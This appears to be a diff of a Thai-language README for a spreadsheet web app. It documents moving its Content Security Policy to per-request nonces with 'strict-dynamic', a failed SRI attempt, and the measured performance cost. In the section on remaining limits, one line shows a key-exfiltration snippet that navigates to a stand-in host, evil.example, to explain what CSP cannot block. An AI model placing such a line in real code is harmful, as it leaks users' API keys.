@@ -1417,6 +1417,7 @@ formulaEngine/ (tokenizer → parser → evaluator → functions)
 
 ```
 src/
+  proxy.ts                   # สร้าง nonce ของ CSP ต่อ request — เหตุผลที่ script-src ไม่มี 'unsafe-inline'
   app/
     page.tsx                 # landing page ที่ / — ฟีเจอร์ + ภาพจากแอปจริง + ปุ่มเข้าแอป (สองภาษาเหมือนกัน)
     app/page.tsx             # ตัวแอปจริงที่ /app แค่ประกอบคอมโพเนนต์ตาม state จาก store (ไม่ถือ state เอง)
@@ -1836,13 +1837,32 @@ flowchart LR
 `connect-src` ระบุไว้แค่สามที่ที่แอปนี้คุยด้วยจริง ๆ สคริปต์ที่ถูกแทรกเข้ามาจึง `fetch` key ออกไปหา
 เซิร์ฟเวอร์ของคนอื่นไม่ได้ และ `form-action` ปิดทางโพสต์ผ่านฟอร์ม
 
-**สิ่งที่มันทำไม่ได้ เขียนไว้ตรงนี้เลย ไม่ปล่อยให้ไปค้นพบเอง:**
+**`script-src` ไม่มี `'unsafe-inline'` แล้ว** และกว่าจะถึงตรงนี้ลองไปสองทาง ซึ่งทั้งสองควรบันทึกไว้
 
-- `script-src` ยังต้องมี `'unsafe-inline'` เพราะ Next.js hydrate ผ่าน inline script ทางแก้จริงคือ nonce
-  ต่อ request จาก middleware ซึ่งทำให้ทุกหน้ากลายเป็น dynamic และทิ้ง static rendering ที่เป็นเหตุผลว่า
-  ทำไมแอปนี้เปิดเร็ว — **นี่ไม่ใช่การหยุด XSS** และการทำเป็นว่าใช่จะแย่กว่าการไม่มี policy เลย
-- CSP หยุด top-level navigation ไม่ได้ (`location = "https://evil.example/?k=" + key`) — directive
-  `navigate-to` ถูกถอดออกจากสเปกไปแล้ว
+ทางแรกคือ **Subresource Integrity** (`experimental.sri`) ที่แฮชทุกไฟล์ bundle — น่าใช้เพราะยังคง
+prerender ไว้ได้ แต่ใช้ไม่ได้ และเบราว์เซอร์บอกเหตุผลตรง ๆ: สคริปต์หกตัวได้ `integrity` แต่**อีกสอง
+ตัวที่เป็น inline ไม่ได้** เพราะ payload ของ React อยู่ในตัวเอกสาร Chrome ปฏิเสธทั้งคู่ และ React โยน
+error #412 — หน้าไม่ hydrate เลย SRI แฮช*ไฟล์* ส่วนสคริปต์ที่อยู่ใน HTML ไม่ใช่ไฟล์ (ยังเปิด setting นี้
+ไว้อยู่ เพราะการตรวจ integrity ของสิ่งที่ CDN ส่งมาไม่มีต้นทุนอะไร)
+
+ทางที่สองคือที่ใช้จริง: [`src/proxy.ts`](src/proxy.ts) สร้าง nonce ใหม่ทุก request ใส่ลงทั้ง policy และ
+request header แล้ว Next เอาไปแปะ inline script ของตัวเอง มาพร้อม `'strict-dynamic'` ซึ่งเป็นตัวที่ทำให้
+directive นี้เข้มจริงไม่ใช่แค่สวย — ถ้าไม่มี สคริปต์ที่ถูกแทรกโดยชี้ `src` มาที่ origin ของเราเองก็ยังผ่าน `'self'` ได้อยู่ดี
+
+**ราคาคือ prerender และวัดก่อนตัดสินใจจ่าย** — nonce ต้องต่างทุก request จึงสร้างหน้าไว้ล่วงหน้าไม่ได้
+(`await connection()` ใน root layout เขียนไว้ตรง ๆ) วัด time to first byte บนเครื่องเดียวกัน ยิงอย่างละ 12 ครั้ง เอาค่ากลาง:
+
+| | prerender | สร้างทุก request |
+|---|---|---|
+| `/` | 5.3 ms | 14.6 ms |
+| `/app` | 5.6 ms | 19.9 ms |
+
+ประมาณ 10–15 มิลลิวินาทีของเวลาเซิร์ฟเวอร์ เทียบกับ LCP 3.4 วินาทีบนมือถือที่ throttle ไว้ — มองไม่เห็น
+ราคาจริงคือ HTML แคชที่ CDN edge ไม่ได้อีกแล้ว ซึ่งสำคัญถ้าผู้ใช้กระจายอยู่ทั่วโลก และไม่สำคัญกับโปรเจกต์นี้
+
+**สิ่งที่ยังทำไม่ได้อยู่ดี:** CSP หยุด top-level navigation ไม่ได้ (`location = "https://evil.example/?k=" + key`)
+— directive `navigate-to` ถูกถอดออกจากสเปกไปแล้ว การบีบทางออกไม่เท่ากับการแก้ XSS แต่ `script-src` ที่เข้ม
+ทำให้การแทรกสคริปต์ยากขึ้นมาก แม้จะไม่ถึงกับเป็นไปไม่ได้
 
 **วัดจริง ไม่ได้เขียนแล้วเชื่อ** — ยิง `fetch` ไปหาโดเมนนอก policy จากในหน้าเว็บ: ถูกปฏิเสธพร้อมข้อความ
 `Refused to connect ... violates the following Content Security Policy directive` ส่วน `api.anthropic.com`
@@ -1926,11 +1946,16 @@ host มี `ANTHROPIC_API_KEY` ตั้งอยู่ก็ตาม แล�
 
 | หน้า | Performance | Accessibility | Best practices | SEO |
 |---|---|---|---|---|
-| Landing `/` | 85 | **100** | **100** | **100** |
-| แอป `/app` | 86 | **100** | **100** | **100** |
+| Landing `/` | 90 | **100** | **100** | **100** |
+| แอป `/app` | 84 | **100** | **100** | **100** |
 
-`/` — FCP 1.3s · LCP 3.8s · TBT 140ms · **CLS 0** · Speed Index 4.1s
-`/app` — FCP 1.0s · LCP 3.8s · TBT 200ms · **CLS 0** · Speed Index 1.0s
+`/` — FCP 1.0s · LCP 3.4s · TBT 160ms · **CLS 0** · Speed Index 1.0s
+`/app` — FCP 1.0s · LCP 3.5s · TBT 310ms · **CLS 0** · Speed Index 1.0s
+
+**วัดใหม่หลังจากที่ nonce ของ CSP ทำให้ prerender ปิดไป** ไม่ได้ปล่อยเลขเก่าค้างไว้ คะแนนขยับไปทั้งสองทาง
+อย่างละไม่กี่แต้ม ซึ่งเป็นเรื่องปกติของการรัน Lighthouse สองครั้ง ส่วนเวลาเซิร์ฟเวอร์ที่เพิ่มมา 10–15 ms
+มองไม่เห็นเลยเมื่อเทียบกับ LCP สามวินาทีครึ่ง — ตัวเลขใน README ที่จริงเฉพาะกับ build เก่า
+เป็นความผิดพลาดที่โปรเจกต์นี้เจอมาแล้วสองครั้ง รันใหม่จึงถูกกว่าการมานั่งเถียง
 
 **Accessibility 100 ทั้งสองหน้า** สอดคล้องกับด่าน [`check:a11y`](#-การทดสอบ) ที่รัน axe ทุก PR —
 คนละเครื่องมือ ผลตรงกัน
@@ -2148,9 +2173,10 @@ CI: `npm run verify` รวมทุกอย่างไว้แล้ว — 
       เฉพาะ `api.anthropic.com` กับ origin ของ Supabase ถ้าตั้งไว้ สคริปต์ที่ถูกแทรกเข้ามาจึงส่ง API key
       ของผู้ใช้ออกไปข้างนอกไม่ได้ พร้อม `frame-ancestors`, `object-src`, `base-uri`, `form-action`,
       `Referrer-Policy`, `nosniff` และ `Permissions-Policy` มีเป็น flow ใน `check:e2e` และพิสูจน์ด้วย
-      การถอด header ออกแล้วด่านตก **ยังเหลือ: `script-src` ยังมี `'unsafe-inline'`** เพราะ Next.js
-      hydrate ผ่าน inline script — nonce ต่อ request ต้องใช้ middleware ซึ่งทำให้ทุกหน้าเป็น dynamic
-      นี่จึงยังไม่ใช่การหยุด XSS แต่เป็นการปิดทางออก
+      การถอด header ออกแล้วด่านตก **และตอนนี้ `script-src` ไม่มี `'unsafe-inline'` แล้ว** — `src/proxy.ts`
+      สร้าง nonce ต่อ request พร้อม `'strict-dynamic'` ลอง SRI ก่อนเพราะอยากเก็บ prerender ไว้ แต่ใช้ไม่ได้:
+      inline script ไม่ใช่ไฟล์จึงแฮชไม่ได้ หน้าเลย hydrate ไม่ขึ้นเลย ราคาที่จ่ายคือ prerender
+      (TTFB +10–15 ms วัดแล้ว) ยังเหลือ: CSP หยุด top-level navigation ไม่ได้
 - [x] **เทสต์ที่เปิดแอปจริง (E2E) ใน CI** — ทำแล้ว: `npm run check:e2e` ขับ Chromium ผ่าน 8 flow
       เป็น job ของตัวเองใน CI — พิมพ์สูตรแล้วค่าขยับ, ส่งออก `.xlsx` แล้วนำกลับเข้ามา, คีย์บอร์ดล้วน, undo,
       และเสียงประกาศ บั๊กสามตัวที่เคยเจอด้วยการนั่งกดเอง อยู่ในขอบเขตของด่านนี้แล้ว และพิสูจน์ด้วยการทำให้พังจริง
